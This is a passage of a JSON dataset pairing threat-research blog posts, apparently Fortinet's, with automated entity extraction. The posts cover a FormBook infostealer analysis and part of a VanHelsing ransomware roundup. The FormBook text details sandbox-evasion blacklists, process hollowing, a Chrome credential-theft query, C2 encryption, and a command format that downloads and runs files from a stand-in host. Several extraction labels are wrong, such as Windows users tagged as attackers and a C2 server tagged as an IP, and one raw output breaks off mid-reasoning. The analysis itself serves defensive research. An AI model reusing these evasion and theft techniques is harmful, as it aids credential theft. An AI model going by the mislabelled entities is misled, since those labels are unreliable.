          "batch of scripts"
        ],
        [
          "malware",
          "executed",
          "PowerShell"
        ],
        [
          "malware",
          "run",
          "Windows process"
        ],
        [
          "malware",
          "deployed",
          "dllhost.exe"
        ],
        [
          "malware",
          "deployed",
          "pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp"
        ],
        [
          "malware",
          "deployed",
          "fullout"
        ],
        [
          "malware",
          "deployed",
          "Windows Loader"
        ],
        [
          "malware",
          "deployed",
          "Windows"
        ],
        [
          "malware",
          "deployed",
          "DOS"
        ],
        [
          "malware",
          "deployed",
          "PE"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 10,
    "relationship_count": 12,
    "model": "Qwen3 4B",
    "index": 13
  },
  {
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part II",
    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the victim’s computerSeverity level:High This is part II of the FormBook analysis blog. In the previous post (Part I), I covered the campaign’s initialization via a phishing email, the CVE-2017-11882 vulnerability it exploited to execute an extracted 64-bit DLL, and the download and decryption of a FormBook variant hidden in a fake PNG file. Finally, I elaborated on how the 64-bit DLL mapped the FormBook payload in a target process (ImagingDevices.exe) and executed it using the process hollowing technique. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In the second part of this analysis, you will learn how the FormBook payload operates on a comprised machine, including the complicated anti-analysis techniques employed by this FormBook variant, how the FormBook leverages Heaven’s Gate and randomly selected processes to evade analysis by cybersecurity researchers, the sensitive data it collects from the victim’s machine, how it communicates with the C2 server, and how it controls the victim’s system with control commands. The FormBook payload is a 32-bit executable that runs inside the 32-bit target process “ImagingDevices.exe”. My analysis reveals that the copied FormBook is re-encrypted. The code initially executed does not belong to the real FormBook but instead serves as a decryption routine. The encrypted data begins at offset 0x6E36C3 (with FormBook loaded at 0x6E0000), and the encrypted data size is hard coded to 0x43600, as illustrated in Figure 1. Next, it calculates the real entry point address from the decrypted code and stores it in the ESI register. This address will be called at the final stage, as shown in Figure 2. FormBook leverages multiple techniques to prevent being analyzed. I explain the main techniques used in this variant below. Figure 4 shows how it calls the ZwOpenDirectoryObject() API (0x2FE3580) inside the duplicated ntdll.dll. In my analysis environment, the original address for the API should be 0x76F43580. This is a module list loaded dynamically by FormBook by their index. Index Module Name 0x1 \"kernel32.dll\" 0x2 \"advapi32.dll\" 0x3 \"ws2_32.dll\" 0x4 \"rstrtmgr.dll\" 0x5 \"sqlite3.dll\" 0x6 \"winsqlite3.dll\" 0x7 \"crypt32.dll\" 0x8 \"vaultcli.dll\" 0x9 \"ole32.dll\" 0xA \"nss3.dll\" 0xB \"user32.dll\" 0xC \"shell32.dll\" FormBook then passes the decrypted module name to a function to load it using a low-level Windows API function, LdrLoadDll(). The desired Windows APIs are not hardcoded strings in FormBook but encrypted hash codes. FormBook traverses the APIs inside the loaded modules and matches their hash codes with the decrypted ones to find the desired APIs. As you can see in Figure 5, the PostThreadMessageW() API was obtained inside the EAX register from the “user32.dll” module. In this variant of FormBook, more than 100 key functions are encrypted by default and are decrypted only before calling. They are then re-encrypted after calling, which presents a challenge for static analysis. As shown on the left side of Figure 6, the SearchDecryptCode() function is called to search the encrypted code by locating the given start magic (6 bytes) and end magic (6 bytes). It then decrypts the located code. At 0x709B15, it calls sub_70DC33(), whose body is shown on the right side. The instructions enclosed by the red rectangle were just decrypted. After executing the dynamic function (sub_70DC33()), it calls ReEncryptCode(), at 0x709B26, to re-encrypt the function. To protect FormBook from being analyzed by auto-analysis platforms, it performs multiple detections. 1. Virtual Machines and Analysis Tools FormBook contains a predefined blacklist of encrypted hash codes, which are generated from process names associated with popular VM platforms or analysis tools, such as VMware (vmwareuser.exe, vmwareservice.exe), Sandboxie (sandboxiedcomlaunch.exe, sandboxierpcss.exe), Sysinternals tools (procmon.exe, regmon.exe, filemon.exe), network sniffers (wireshark.exe, netmon.exe), automation scripts (python.exe, perl.exe), and more. It retrieves all active processes from the victim’s system, generates a hash code from their process names, and compares them with a predefined set of blacklisted hash codes. The following code snippet demonstrates how it decrypts a hash code from 0x72FE2A27, which is 0x3EBE9086 generated from “vmwareuser.exe”. …… 006F642Aleaecx, [ebp+Dest]; Current process name. 006F6430pushecx 006F6431push3Ah; Decryption key. 006F6433push72FE2A27h; Encrypted hash code. 006F6438calldecrypt_fun; Decrypts a hash code. 006F643Daddesp, 8 006F6440pusheax; EAX holds the decrypted hash code, 0x3EBE9086, which is generated from “vmwareuser.exe”. 006F6441callmatch_hashcode; Compares with the current process. 006F6446addesp, 8 006F6449testeax, eax 006F644Bjnzanalysis_detected …… Once matched, it sets a global flag indicating it’s running in an analysis environment. 2. Detecting Sandbox Environments Some auto-analysis sandboxes run the target process from specific folders. FormBook detects this by retrieving the full path of the target process it hollowed into. In my analysis machine, it’s: “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe”. It then checks if the parent folder contains keywords from a blacklist by matching their hash codes. Examples include: “\\cuckoo\\”, “\\sandcastle\\”, “\\aswsnx\\”, “\\sandbox\\”, “\\smpdir\\”, “\\samroot\\”, and “\\avctestsuite\\” Below is an example of full path triggers detection: “C:\\cuckoo\\Windows Photo Viewer\\ImagingDevices.exe” 3. Windows Account Name It calls the Windows API RtlQueryEnvironmentVariable_U() with “USERNAME” as the variable name to retrieve the victim’s username. Figure 7 demonstrates the retrieved username after calling the API. It then generates a hash code from the username and compares it with those in a blacklist. FormBook assumes the usernames starting with certain patterns (e.g., “cuckoo”, “sandbox-“, “nmsdbox-“, and more) belong to auto-analysis systems. All of the above detection results are stored in global flags. FormBook checks these flags in a function and exits the process if any of them is set. It checks if a kernel-mode debugger (like Windbg) is enabled by calling the API NtQuerySystemInformation() with SystemKernelDebuggerInformation(0x23) system information class. Refer to Figure 8 for more details. If the KernelDebuggerEnabled is 1, it means a kernel debugger is present. It also determines if the user-mode debugger is present by passing ProcessDebugPort (0x7) as a ProcessInformationClass parameter to the ZwQueryInformationProcess() API. It returns 0xFFFFFFFF if a user-mode debugger is attached, such as x32dbg, which I used during the analysis. The Heaven’s Gate technique is a mechanism on Windows x64 systems that allows switching from 32-bit to 64-bit code inside a 32-bit process. It is also known as WoW64 (Windows-on-Windows 64-bit). This transition is the essence of “Heaven’s Gate.” The mechanism presents a significant challenge to cybersecurity researchers because a 32-bit debugger cannot debug 64-bit code, interrupting the debugging process. The Windows x64 architecture determines the execution mode based on the CS (Code Segment) register. In user mode (ring 3), 0x23 corresponds to the 32-bit code segment, while 0x33 corresponds to the 64-bit code segment. Executing an instruction like “jmp far 0x33:{address}” in a 32-bit process switches to 64-bit mode and executes 64-bit code from the {address}. This variant of FormBook uses the Heaven’s Gate technique multiple times, which will be explained in the following sections. FormBook randomly selects one of the explorer.exe child processes from active processes and leverages the Heaven’s Gate technique to manipulate the selected process. The malware first calls the NtQuerySystemInformation() API with the SystemProcessInformation (0x5) parameter to enumerate all active processes. It locates the PID (Process ID) of explorer.exe by comparing process name hash codes. Next, it scans the active processes to randomly choose a child process of explorer.exe by matching the active processes’ PPID (Parent Process ID) with the explorer.exe’s PID (Figure 9). After obtaining the process handle of the selected process (e.g., notepad.exe) by calling the NtOpenProcess() API, FormBook creates a shared memory between the two processes and copies the shellcode: It then utilizes the Heaven’s Gate technique to execute a piece of 64-bit code that had been copied and deployed in a newly allocated buffer. Figure 10 is about to execute “jmp far 33:2F30000”, where 0x33 is the new CS and 0x2F30000 is the new buffer’s address with the copied 64-bit code, as shown in the memory. Upon completion, it returns to 23:7107C0, which has already been pushed onto the top of the stack. My analysis reveals that the 64-bit code takes control of the selected process’s main thread (like notepad.exe) to execute a piece of injected malicious code. To control the selected process, it calls the NtOpenProcess() and ZwQueryInformationProcess() APIs to retrieve the process’ details. The APIs ZwOpenThread() and ZwSuspendThread() are called to pass the selected process’ information to suspend the main thread inside the selected process. In Figure 11, we can see that the 64-bit code just called ZwSuspendThread(), and in another debugger attached to the chosen process, it displays the suspended main thread. Subsequently, the 64-bit code copies the malicious payload into the selected process over the shared memory. It then calls NtGetContextThread() and NtSetContextThread() to modify the RIP register, redirecting the execution to the injected code. Finally, it calls the NtResumeThread() API to resume the main thread, causing the malicious code to run inside the selected process, notepad.exe. Execution then returns to the 32-bit code by executing a “retf” instruction. This time, the selected child process of explorer.exe is a Notepad.exe with the PID 9560. The copied malicious code is the same as the 64-bit code mentioned earlier, but it goes down different code branches depending on a returned flag. Twelve encrypted process names are saved in local variables, which can be obtained using a function with a string index. The table below lists all the processes and indexes. String Index Process Names 0x0 \"PATHPING.EXE\" 0x1 \"fontview.exe\" 0x2 \"MuiUnattend.exe\" 0x3 \"forfiles.exe\" 0x4 \"chkntfs.exe\" 0x5 \"find.exe\" 0x6 \"DpiScaling.exe\" 0x7 \"waitfor.exe\" 0x8 \"net.exe\" 0x9 \"icsunattend.exe\" 0xa \"cttune.exe\" 0xb \"whoami.exe\" These 32-bit processes all reside in the “C:\\Windows\\SysWOW64\\” folder. FormBook repeatedly launches these processes in a loop until one is successfully created. It then performs process hollowing on the process, injects the FormBook payload into the process (such as “PATHPING.EXE”), and executes it. As shown in Figure 12, it is about to call the CreateProcessInternalW() API to create a PATHPING.EXE process, with the dwCreationFlags parameter set to 0x800000C, indicating a suspended process will be created. It then creates a shared memory section between notepad.exe and PATHPING.EXE. At this point, the task of the code running in the selected process (notepad.exe) is completed. Switching to the target process (ImagingDevices.exe), it returns to the 32-bit code mode from the 64-bit code via Heaven’s Gate. It brings the full process information of the newly created PATHPING.EXE process using the shared memory established between it and the selected notepad.exe process. ImagingDevices.exe takes control of the PATHPING.EXE process and copies the FormBook payload into the PATHPING.EXE process via the shared memory section. As shown in Figure 14, the payload is encrypted and mapped into both processes’ memory, having been written by code running inside ImagingDevices.exe. Next, ImagingDevices.exe calls the NtSetContextThread() API to modify the PATHPING.EXE’s EAX register (which holds a thread function address to RtlUserThreadStart().) to redirect the execution to a specific function. This function decrypts the FormBook payload and calls the entry point function of the FormBook payload once the NtResumeThread() API is called. After employing numerous evasion techniques, FormBook finally hits the main payload within the PATHPING.EXE process, another 32-bit process. Based on my analysis, this process function acts as a dashboard program for FormBook. It gathers sensitive data from the victim’s system and manipulates another selected process to communicate with its C2 server. FormBook collects basic information from the victim’s device, such as the Windows product name, the current build, the username, and the computer name. Some are obtained from the system registry via API calls, while others are retrieved using the RtlQueryEnvironmentVariable_U() API. This information is then encrypted and saved in a global variable, which is later sent to the C2 server in an HTTP GET packet to register the infected system. As shown in Figure 15, the malware prepares to encrypt the collected basic information, where “XLNG…” is a magic string, “Windows 10 Enterprise x64” is the Windows product information, followed by the Base64-encoded computer name and user name. FormBook then randomly selects another child process of explorer.exe. Similar to what was done in the ImagingDevices.exe process, it invokes 64-bit code from the 32-bit process using the Heaven’s Gate technique. This 64-bit code copies and deploys the FormBook into the newly selected process (e.g., another notepad.exe process) and modifies the RIP register to point to the deployed FormBook at a different entry point. According to my analysis, this newly selected process acts as a socket process responsible for communicating with the C2 server. A large shared memory section is created and mapped into PATHING.EXE and the chosen data exchange process. When it returns to 32-bit mode (using Heaven’s Gate) in the PATHPING.EXE process, FormBook calls the PostThreadMessageW() API with a Msg parameter of 0x111 (WM_COMMAND) to send a message to the main thread of the selected process (like notepad.exe), as shown in Figure 16. Instead of calling NtResumeThread() to resume thread execution, FormBook sends a Windows message to activate the payload. Why does it send a message to run the FormBook as a socket process? As we know, most Windows programs are driven by Windows messages. Most of the time, a program remains idle because the message queue is empty—there is no user interaction (mouse, keyboard, etc.), system events, or other messages. The program waits (blocked by the NtUserGetMessage() API) until a new message arrives. If FormBook modifies the value of the RIP register to point to the copied FormBook payload and then proactively sends a message to the process, it can then hijack the original execution flow and redirect it to run the FormBook payload instead. The FormBook instance in PATHPING.EXE also acts as a daemon, monitoring the socket process. Once the victim terminates the socket process, FormBook immediately selects another child process of explorer.exe to take its place. The FormBook instance running in PATHPING.EXE harvests sensitive data from the compromised system, such as saved credentials of various software, autofill data, cookies, proxy settings for browsers, and data from the system clipboard. FormBook can also obtain sensitive data from multiple resources, such as the system registry and the local profile files. For example, it extracts the autofill data for the IE browser from the key path “HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2” in the system registry. It also collects email account information from Outlook by scanning the following key paths in the system registry to cover multiple Outlook versions: When gathering sensitive data from Chrome, FormBook accesses some SQLite database format files located in “%LocalData%\\Google\\Chrome\\User Data\\Login Data\\Default\\”, explicitly targeting these files: “Login Data” (credentials), “Cookies” (web site cookies), “Web Data” (autofill), and “Network” (proxy setting). This is accomplished through a series of winsqlite3.dll API calls, including sqlite3_open(), sqlite3_prepare_v2(), sqlite3_step(), sqlite3_column_text(), sqlite3_column_blob(), sqlite3_column_bytes(), and sqlite3_close(). Figure 17 demonstrates Chrome credential extraction, showing FormBook executing the SQL query “SELECT origin_url, username_value, password_value FROM logins” via the sqlite3_prepare_v2() API. The sample credentials, shown at the bottom, were just obtained from a Chrome browser in a test environment. The malware maintains the capability to collect similar sensitive data from a wide range of additional applications. Below are the categorized software applications from which FormBook can collect sensitive data: Email Clients: Outlook, Thunderbird, and Foxmail. Web Browsers: Internet Explorer, Chrome, Firefox, Edge, Brave-Browser, Opera Neon, ChromePlus, Avast Secure Browser, Yandex Browser, Citrio, Sleipnir 5, Epic Privacy Browser, Elements Browser, 360 Chrome, CCleaner Browser, Sputnik, Cốc Cốc Browser, Opera, Uran, Coowon Browser, Comodo Dragon, AVG Secure Browser, CentBrowser, 7Star Browser, UR Browser, SalamWeb, QIP Surf, Chromium, Iridium Browser, Slimjet, Vivaldi, Orbitum, Liebao, Kometa Browser, Chedot, Torch Browser, Amigo, Kinza, and Blisk, Let’s now examine the socket process (another selected process, like notepad.exe) that handles communication with the Command-and-Control (C2) server in the background. The C2 domain list in this variant of FormBook is not stored in plaintext. Instead, it undergoes a multi-layered obfuscation process. Each domain is encrypted, encoded using Base64, and then encrypted again. This technique adds significant complexity to static analysis and helps evade detection. This variant has 64 C2 domains, which are dynamically retrieved in the socket process by referencing a one-byte index. The decrypted domains only exist temporarily in memory during runtime, making them more elusive. For the complete list of C2 domains, refer to the IOCs section at the end of this report. Figure 18 shows the socket process after successfully decrypting a C2 server domain from memory. The decrypted domain is “www[.]manicure-nano[.]sbs,” corresponding to index 0x2B, with the associated URL “/xkx8/”. A shared memory section is created between PATHPING.EXE and the socket process (like notepad.exe), which is used to share: Another responsibility of the socket process is to gather system clipboard data. FormBook performs this by running a thread calling the relevant APIs: OpenClipboard(), GetClipboardData(), GlobalLock(), GlobalUnlock(), and CloseClipboard(). The collected clipboard data is also stored in shared memory. Within the socket process, FormBook starts a specific thread to repeatedly check if a flag is set by PATHPING.EXE that tells if the collected data is ready to send. Once the flag is triggered, FormBook transmits the collected data using HTTP GET and POST. Based on my analysis, basic system information is sent via GET, and other data is sent via POST. As shown in Figure 19, execution breaks at a function call (located at 0x1F08625B1D1) that is responsible for encrypting collected credentials—retrieved from Mozilla Firefox in this instance—in the memory dump before sending them to the C2 server. To evade detection during transmission, FormBook encrypts and encodes the data before sending it out. Each C2 server has its own unique 0x14-byte-long encryption key seed hardcoded in memory. The data undergoes two layers of encryption. It first uses a common predefined key to encrypt the data, then uses the C2 server’s own encryption key to encrypt it again. After this double encryption, FormBook encodes the data using the standard base64 algorithm. Figure 20 shows a screenshot of an HTTP Post packet in Wireshark, illustrating how FormBook sends collected data to a C2 server. The URL in this case is www[.]grcgrg[.]net/jxyu/. The encrypted data is located in the body portion of the POST request, prefixed with a randomly generated string, “30J0cVz=”. As mentioned before, when the socket process receives a command packet from the C2 server, it saves it in shared memory and sets a corresponding flag. This informs the FormBook instance running in the PATHPING.EXE to process the C2 command. All incoming packets from the C2 server are multi-layer encrypted and Base64-encoded. Once received, the PATHPING.EXE instance decrypts and decodes the packets before interpretation. A decrypted packet format looks like this: “XLNG{command ID}{command data}{XLNG}” FormBook Control Commands: 1.     ‘1’ – 0x31: This command delivers three kinds of executable files within the packet: *.dll, *.ps1, and *.exe. Once this command is received, FormBook saves the file into the system %temp% directory and then executes it on the victim’s system. 2.     ‘2’ – 0x32: This command can be used to update the FormBook or execute other malware. FormBook receives a 32-bit EXE file in the packet and saves it into a randomly generated temp file within the system. After that, it executes the EXE file by invoking the CreateProcessInternalW() API. As shown in Figure 21, it just wrote the 32-bit EXE data into a temp file, such as “%temp%\\yzbtfb3.exe.” It finally calls ExitProcess() to exit the current FormBook process (PATHPING.EXE). 3.     ‘3’ – 0x33: This command is used to remove FormBook from the victim’s system. It deletes Formbook's file and Auto-run items from the system registry and exits the current FormBook instance. It also restarts the Explorer.exe process. 4.     ‘4’ – 0x34: When FormBook receives this command, it downloads an executable file from a given URL that comes with the packet if a subcommand is provided. Otherwise, it only executes a given command. This variant of FormBook provides two sub-commands: Below are three cases that demonstrate how the ‘4’ command works. Without sub-command: XLNG4cmd.exeXLNG RMTD sub-command: XLNG4RMTD:http://test.com/test.exeXLNG RMTU sub-command: XLNG4RMTU:http://test.com/test.ps1XLNG FormBook downloads the file into a randomly named file under the system’s %temp% folder. It calls a series of APIs to do so, such as InternetOpenW(), InternetConnectW(), HttpOpenRequestW(), HttpSendRequestW(), InternetQueryDataAvailable(), and InternetReadFile(). Finally, FormBook calls ShellExecuteA to execute the downloaded file in the compromised system. If no sub-commend is provided in the command data, it means the command data is not a URL, which can be executed directly by calling the ShellExecuteA() API. Figure 22 provides an example with a simulated control command packet, which was about to call an API to launch “C:\\Windows\\system32\\mspaint.exe”. 5.     ‘5’ – 0x35: This command allows FormBook to clean sensitive data saved on the victim's browsers, such as cookies, credentials, and more. It also deletes some folders and files from the compromised system by calling the SHFileOperationW() API. The affected paths are: • \"%WinDir%\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\\Low\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\\Low\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Cookies\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Current Session\"• \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\{ProfileName}\\Cookies.sqlite\" 6.     ‘6’ – 0x36: This command instructs FormBook to collect sensitive data that will be sent to the C2 server, as explained in the “Collect Sensitive Data” section above. 7.     ‘7’ – 0x37: Reboots the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_REBOOT parameter to reboot the system. 8.     ‘8’ – 0x38: Powers off the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_POWEROFF parameter to power off the system. 9.     ‘9’ – 0x39: In this variant, the command corresponds to an empty function. In this second part of the FormBook blog series, I explained how the FormBook payload operates within the 32-bit target process, “ImagingDevices.exe.” Figure 23 provides an overview of the entire workflow executed by the payload. I also showed the various complicated anti-analysis techniques used by this FormBook variant, including—but not limited to—a hidden ntdll.dll module, API obfuscation, more than 100 encrypted key functions, anti-sandbox techniques, anti-debugging, and the repeated use of Heaven’s Gate techniques. I then explained how FormBook randomly selects a process from active processes and takes control of it using the Heaven’s Gate technique. Its main objective is to perform process hollowing on the selected process (say PATHPING.EXE), inject FormBook into the process, and execute it as a dashboard. Once running, FormBook collects a wide range of sensitive data from the victim’s system, including, but not limited to, basic system information, saved credentials, cookie data, autofill data, browser history, and more. Next, I described how the C2 server list in this FormBook variant is decrypted and decoded, and how stolen sensitive data is formatted and transmitted in network packets. Finally, I examined FormBook’s nine control commands, which enable a wide array of capabilities, such as executing provided executable files, launching an existing file, downloading and executing EXE, DLL, and PS1 files, and remotely rebooting or shutting down the victim’s machine. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for accessing FormBook’s C2 server. The C2 server list is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You can sign up to receive future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://www[.]arwintarim[.]xyz/shoy/hxxp://www[.]promutuus[.]xyz/bpae/hxxp://www[.]218735[.]bid/3f5o/hxxp://www[.]vivamente[.]shop/xr41/hxxp://www[.]segurooshop[.]shop/wcz8/hxxp://www[.]hugeblockchain[.]xyz/1dpy/hxxp://www[.]crazymeme[.]xyz/78bm/hxxp://www[.]extremedoge[.]xyz/372c/hxxp://www[.]685648[.]wang/3k4m/hxxp://www[.]shibfestival[.]xyz/8538/hxxp://www[.]promoconfortbaby[.]store/1pxl/hxxp://www[.]balivegasbaru2[.]xyz/cfze/hxxp://www[.]themutznuts[.]xyz/ks15/hxxp://www[.]kpilal[.]info/9o26/hxxp://www[.]dogeeditor[.]xyz/x5dz/hxxp://www[.]adjokctp[.]icu/3ya5/hxxp://www[.]kasun[.]wtf/u4ue/hxxp://www[.]031235246[.]xyz/ml07/hxxp://www[.]intention[.]digital/h6z3/hxxp://www[.]prepaidbitcoin[.]xyz/rcx4/hxxp://www[.]ddvids[.]xyz/uiki/hxxp://www[.]zhuanphysical[.]shop/zcro/hxxp://www[.]theweb[.]services/fb40/hxxp://www[.]sdwd[.]wang/sfv4/hxxp://www[.]lucynoel6465[.]shop/1i64/hxxp://www[.]nhc7tdkp6[.]live/d9kr/hxxp://www[.]ciptaan[.]xyz/fjwa/hxxp://www[.]gluconolmx[.]shop/8370/hxxp://www[.]shlomi[.]app/5nwk/hxxp://www[.]garfo[.]xyz/35rt/hxxp://www[.]caral[.]tokyo/plub/hxxp://www[.]meritking[.]cloud/gakd/hxxp://www[.]grcgrg[.]net/jxyu/hxxp://www[.]nullus[.]xyz/pf7y/hxxp://www[.]actionlow[.]live/0a0g/hxxp://www[.]dangky88kfree[.]online/11lg/hxxp://www[.]szty13[.]vip/abhi/hxxp://www[.]arryongro-nambe[.]live/h108/hxxp://www[.]dqvcbn[.]info/iby8/hxxp://www[.]svapo-discount[.]net/s956/hxxp://www[.]yueolt[.]shop/je6k/hxxp://www[.]sigaque[.]today/u2nq/hxxp://www[.]manicure-nano[.]sbs/xkx8/hxxp://www[.]laohuc58[.]net/zyjq/hxxp://www[.]iighpb[.]bid/jfhd/hxxp://www[.]fjlgyc[.]info/txra/hxxp://www[.]sbualdwhryi[.]info/dbdy/hxxp://www[.]xrrkkv[.]info/eg97/hxxp://www[.]08081[.]pink/2wr9/hxxp://www[.]jyc11[.]top/xz2s/hxxp://www[.]kdjsswzx[.]club/h3ut/hxxp://www[.]gnlokn[.]info/lmor/hxxp://www[.]btbjpu[.]info/pjhe/hxxp://www[.]bellysweep[.]net/gr1r/hxxp://www[.]dilgxp[.]info/7qht/hxxp://www[.]leveledge[.]sbs/asbs/hxxp://www[.]ethereumpartner[.]xyz/xou3/hxxp://www[.]choujiezhibo[.]net/pu7t/hxxp://www[.]domuss[.]asia/yf4f/hxxp://www[.]seasay[.]xyz/xwy3/hxxp://www[.]tumbetgirislinki[.]fit/i8hk/hxxp://www[.]ef4refef[.]sbs/f88b/hxxp://www[.]aicycling[.]pro/4m7q/hxxp://www[.]autonomousrich[.]xyz/iej0/ malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FormBook, Malware), (CVE-2017-11882, Vulnerability), (ImagingDevices.exe, File), (Heaven’s Gate, Tool), (C2 server, IP), (FormBook variant, Malware), (Windows Users, Attacker), (Microsoft Windows, Threat Type), (2025 Global Threat Landscape Report, File), (Part I, File), (Part II, File)\nRelationships: (FormBook, exploits, CVE-2017-11882), (FormBook, execute, ImagingDevices.exe), (FormBook, uses, Heaven’s Gate), (FormBook, communicateWith, C2 server), (FormBook, target, Windows Users), (FormBook, associatedWith, ImagingDevices.exe), (FormBook variant, associatedWith, FormBook), (Microsoft Windows, target, Windows Users), (FormBook, re-encrypted), (FormBook, run, ImagingDevices.exe)\nOkay, let's break this down. The input text is about a FormBook malware analysis. First, I need to identify all the entities of the specified types.\n\nStarting with Malware: The text mentions \"FormBook\" and \"FormBook variant\". Both are types of malware, so those are Malware entities.\n\nNext, Threat Type: The text says \"Microsoft Windows\" is the affected platform, but the example shows that \"Threat Type\" includes",
      "entities": [
        [
          "FormBook",
          "Malware"
        ],
        [
          "CVE-2017-11882",
          "Vulnerability"
        ],
        [
          "ImagingDevices.exe",
          "File"
        ],
        [
          "Heaven’s Gate",
          "Tool"
        ],
        [
          "C2 server",
          "IP"
        ],
        [
          "FormBook variant",
          "Malware"
        ],
        [
          "Windows Users",
          "Attacker"
        ],
        [
          "Microsoft Windows",
          "Threat Type"
        ],
        [
          "2025 Global Threat Landscape Report",
          "File"
        ],
        [
          "Part I",
          "File"
        ],
        [
          "Part II",
          "File"
        ]
      ],
      "relationships": [
        [
          "FormBook",
          "exploits",
          "CVE-2017-11882"
        ],
        [
          "FormBook",
          "execute",
          "ImagingDevices.exe"
        ],
        [
          "FormBook",
          "uses",
          "Heaven’s Gate"
        ],
        [
          "FormBook",
          "communicateWith",
          "C2 server"
        ],
        [
          "FormBook",
          "target",
          "Windows Users"
        ],
        [
          "FormBook",
          "associatedWith",
          "ImagingDevices.exe"
        ],
        [
          "FormBook variant",
          "associatedWith",
          "FormBook"
        ],
        [
          "Microsoft Windows",
          "target",
          "Windows Users"
        ],
        [
          "FormBook",
          "re-encrypted"
        ],
        [
          "FormBook",
          "run",
          "ImagingDevices.exe"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 10,
    "model": "Qwen3 4B",
    "index": 14
  },
  {
    "title": "Ransomware Roundup – VanHelsing",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-vanhelsing",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the VanHelsing ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands a ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the VanHelsing ransomware was made available on a publicly available file-scanning site in mid-March 2025. Like other ransomware attacks, VanHelsing demands a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the VanHelsing ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the VanHelsing ransomware (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) takes the following command line arguments: The VanHelsing ransomware then encrypts files on the compromised machines and adds the file extension “.vanlocker” to affected files. Note that although this VanHelsing variant (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) uses “.vanlocker” as its extension, it still belongs to the VanHelsing ransomware family because it uses the same ransom negotiation and data leak sites as another VanHelsing variant. (SHA2: 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17) This other variant adds a “.vanhelsing” file extension to the files it encrypts. The VanHelsing ransomware exempts the following files: boot.ini autofun.inf bootfont.bin bootsect.bak desktop.ini ntldr ntuser.dat ntuser.dat.log ntuser.ini thumb.db GDIPFONTCACHEV1.DAT iconcache.db d3d9caps.dat LOGS.txt README.txt It also avoids encrypting files with the following file extensions: .vanlocker .exe .dll .lnk .sys .msi .bat .bin .com .cmd .386 .adv .ani .cab .ico .mod .msstyles .msu .nomedia .ps1 .rtp .syss .deskthemepack .cur .cpl .diagcab .diagcfg .diagpke .dll .drv .hlp .pdb .hta .key .lock .ldf .ocx .icl .icns .ics .idx .mod .mpa .msc .msp .nls .rom .scr .shs .spl .theme .thempa .wpx The VanHelsing ransomware avoids encrypting files in the following folders: tmp wiint temp thumb $Recycle.Bin $RECYCLE.BIN System Volume Information boot Windows Trend Micro program files program files(x86) tor browser Windows intel all users msocache perflogs default microsoft It also creates the following mutex: It may also modify the registry key Software\\Classes\\.vanlocker\\DefaultIcon to use a custom icon for .VANLOCKER files. However, we did not observe this VanHelsing ransomware sample change the file icon of the encrypted files in our testing. It then drops the following ransom note in “README.txt”: The ransom note directs victims to chat sites operated by the attacker on TOR, where ransom negotiation takes place. The ransomware also replaces the desktop wallpaper with its own. The VanHelsing ransomware operates a TOR site where the group posts the information it has stolen from its victims. At the time of our initial investigation in late March 2025, six victims were on the data leak site, and they had added one more victim when we checked back in mid-April. Our analysis of the VanHelsing ransomware victims listed on the data leak site found: Note that victims who have paid the ransom may have been removed from the data leak site. As such, additional companies may have been affected by the VanHelsing ransomware. The VanHelsing ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware 